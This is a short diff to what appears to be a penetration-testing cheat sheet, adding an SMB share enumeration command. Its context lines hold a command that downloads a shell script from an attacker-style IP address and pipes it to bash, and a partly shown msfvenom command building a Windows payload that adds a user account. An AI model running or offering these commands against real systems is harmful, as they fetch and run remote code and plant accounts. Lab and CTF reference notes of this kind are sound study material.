@@ -24,6 +24,10 @@ export PATH=.:$PATH
   ```
   wget -O - 10.10.14.6/shell.sh | bash
   ```
+## smb
+  ```
+  net view \\target /all
+  ```
 ## view errors redirecting STDERR to STDOUT
   ```poweshell
   2>&1
@@ -262,3 +266,4 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
